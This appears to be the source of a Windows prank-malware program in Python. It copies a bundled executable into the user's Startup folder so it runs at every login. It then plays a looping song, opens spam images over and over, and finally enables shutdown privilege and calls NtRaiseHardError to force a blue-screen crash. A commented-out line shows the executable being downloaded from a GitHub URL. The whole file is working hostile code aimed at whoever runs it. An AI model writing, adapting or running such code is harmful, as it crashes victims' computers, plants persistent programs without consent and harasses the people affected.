import os
import shutil
import sys
import time
from pathlib import Path
import requests
from ctypes import windll, c_int, c_uint, c_ulong, byref, POINTER

def get_asset_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return Path(base_path) / relative_path

def play_audio(path):
    # Uses Windows Media Control Interface (no Pygame needed)
    windll.winmm.mciSendStringW(f'open "{path}" type mpegvideo alias bgm', None, 0, 0)
    windll.winmm.mciSendStringW('play bgm repeat', None, 0, 0)

def mouse_setup():
    # %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    # r = requests.get("https://github.com/skykosiner/charlie-kirk/raw/refs/heads/master/dist/mouse.exe", stream=True)
    #
    # with open('dist/mouse.exe', 'wb') as out_file:
    #     out_file.write(r.content)

    mouse_path = get_asset_path("assets/mouse.exe")
    shutil.copy(mouse_path,os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))

def main():
    mouse_setup()

    song_path = get_asset_path("assets/we-are-charlie-kirk-song.mp3")
    spam_dir = get_asset_path("assets/spam")

    if song_path.exists():
        play_audio(str(song_path))

    extensions = {'.jpg', '.png', '.jpeg', '.webp'}
    image_files = [i for i in spam_dir.iterdir() if i.suffix.lower() in extensions]

    for _ in range(3):
        for path in image_files:
            os.startfile(str(path))
            time.sleep(0.5)

    nullptr = POINTER(c_int)()
    windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))

    # BSOD Trigger
    windll.ntdll.NtRaiseHardError(
        c_ulong(0xc000007B),
        c_ulong(0),
        nullptr,
        nullptr,
        c_uint(6),
        byref(c_uint())
    )

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
